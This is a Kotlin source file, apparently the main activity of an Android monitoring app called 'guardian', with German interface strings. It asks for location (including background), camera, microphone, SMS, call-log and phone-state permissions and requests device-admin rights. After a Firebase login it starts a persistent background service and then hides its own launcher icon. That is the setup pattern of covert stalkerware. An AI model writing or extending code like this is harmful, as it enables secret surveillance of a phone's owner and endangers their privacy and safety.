package com.salzkreis.guardian

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.view.View
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.salzkreis.guardian.admin.AdminReceiver
import com.salzkreis.guardian.databinding.ActivityMainBinding
import com.salzkreis.guardian.managers.FirebaseManager
import com.salzkreis.guardian.services.GuardianService
import kotlinx.coroutines.launch

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private lateinit var firebaseManager: FirebaseManager

    private val adminComponent by lazy { ComponentName(this, AdminReceiver::class.java) }
    private val dpm by lazy { getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager }

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { activate() }

    private val adminLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { activate() }

    private val permissions = arrayOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.ACCESS_BACKGROUND_LOCATION,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.POST_NOTIFICATIONS,
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        firebaseManager = FirebaseManager(this)

        if (firebaseManager.isConfigured()) {
            startGuardianService()
            finish()
            return
        }

        binding.btnActivate.setOnClickListener {
            val email = binding.etEmail.text.toString().trim()
            val password = binding.etPassword.text.toString().trim()
            val deviceId = binding.etDeviceId.text.toString().trim()
            if (email.isEmpty() || password.isEmpty() || deviceId.isEmpty()) {
                binding.tvStatus.visibility = View.VISIBLE
                binding.tvStatus.text = "Bitte alle Felder ausfüllen"
                return@setOnClickListener
            }
            requestMissingPermissions()
        }

        // Berechtigungs-Buttons ausblenden – alles läuft über den einen Button
        binding.btnRequestPermissions.visibility = View.GONE
        binding.btnRequestAdmin.visibility = View.GONE
    }

    private fun requestMissingPermissions() {
        val missing = permissions.filter {
            checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing.isNotEmpty()) {
            permissionLauncher.launch(missing.toTypedArray())
        } else {
            activate()
        }
    }

    private fun activate() {
        // Geräteadmin anfordern falls noch nicht aktiv
        if (!dpm.isAdminActive(adminComponent)) {
            adminLauncher.launch(
                Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, getString(R.string.admin_description))
                }
            )
            return
        }

        // Firebase-Login & Aktivierung
        val email = binding.etEmail.text.toString().trim()
        val password = binding.etPassword.text.toString().trim()
        val deviceId = binding.etDeviceId.text.toString().trim()

        binding.btnActivate.isEnabled = false
        binding.tvStatus.visibility = View.VISIBLE
        binding.tvStatus.text = "Verbinde mit Firebase…"

        lifecycleScope.launch {
            try {
                firebaseManager.signInAndConfigure(email, password, deviceId)
                startGuardianService()
                hideAppIcon()
                finish()
            } catch (e: Exception) {
                binding.tvStatus.text = "Fehler: ${e.message}"
                binding.btnActivate.isEnabled = true
            }
        }
    }

    private fun startGuardianService() {
        startForegroundService(Intent(this, GuardianService::class.java))
    }

    private fun hideAppIcon() {
        packageManager.setComponentEnabledSetting(
            ComponentName(this, "com.salzkreis.guardian.MainLauncher"),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }
}
